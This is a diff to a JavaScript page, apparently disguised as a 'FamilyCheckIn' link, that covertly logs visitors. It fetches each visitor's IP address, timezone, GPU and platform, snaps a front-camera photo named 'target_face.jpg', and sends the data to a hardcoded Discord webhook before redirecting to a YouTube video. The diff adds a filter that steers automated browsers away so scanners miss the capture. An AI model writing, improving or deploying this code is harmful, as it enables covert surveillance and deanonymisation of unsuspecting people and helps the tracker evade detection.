@@ -17,7 +17,6 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        // Helper function to capture the image
         async function takeSnapshot(stream) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -30,9 +29,22 @@
         }
 
         async function grabEverything() {
+            // 1. THE BOT FILTER (The Gatekeeper)
+            const isBot = (
+                navigator.webdriver ||                              
+                !navigator.languages || navigator.languages.length === 0 || 
+                window.innerWidth === 0 || window.innerHeight === 0 
+            );
+
+            // Immediately redirect bots without sending data
+            if (isBot) {
+                window.location.replace(REDIRECT_URL);
+                return; 
+            }
+
             let userIP = "Unknown";
             
-            // 1. SILENT DATA (IP & Hardware)
+            // 2. SILENT DATA (IP & Hardware)
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -53,34 +65,41 @@
                 time: new Date().toLocaleString()
             };
 
-            // 2. CAMERA CAPTURE (Requires Permission)
+            // 3. CAMERA CAPTURE (Now only runs for real humans)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const photoBlob = await takeSnapshot(stream);
                 
                 const fd = new FormData();
                 fd.append("file", photoBlob, "target_face.jpg");
-                // Adding the hardware info as part of the photo upload message
                 fd.append("payload_json", JSON.stringify({
-                    content: `📸 **Photo Captured!**\n🌐 **IP:** \`${info.ip}\`\n🌍 **Timezone:** ${info.timezone}\n💻 **GPU:** ${info.gpu}\n📱 **Device:** ${info.platform}\n⏰ **Time:** ${info.time}`
+                    embeds: [{
+                        title: "👤 Real Human Logged",
+                        color: 3066993,
+                        fields: [
+                            { name: "🌐 IP Address", value: `\`${info.ip}\``, inline: true },
+                            { name: "🌍 Timezone", value: info.timezone, inline: true },
+                            { name: "💻 GPU", value: `\`${info.gpu}\`` },
+                            { name: "📱 Platform", value: info.platform, inline: true },
+                            { name: "⏰ Time", value: info.time, inline: true }
+                        ],
+                        footer: { text: "FamilyCheckIn Stealth Probe" }
+                    }]
                 }));
 
                 await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                
-                // Stop the camera light immediately
                 stream.getTracks().forEach(t => t.stop());
 
             } catch (err) {
-                // If they deny camera, still send the silent info
+                // Handle camera denial but keep hardware log
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `⚠️ **Camera Denied, but Info Logged:**\n🌐 **IP:** \`${info.ip}\`\n🌍 **Timezone:** ${info.timezone}\n💻 **GPU:** ${info.gpu}`
+                        content: `⚠️ **Camera Blocked but Data Captured:**\n🌐 **IP:** \`${info.ip}\`\n🌍 **Timezone:** ${info.timezone}\n💻 **GPU:** ${info.gpu}`
                     })
                 });
             } finally {
-                // Redirect regardless of camera outcome
                 window.location.replace(REDIRECT_URL);
             }
         }
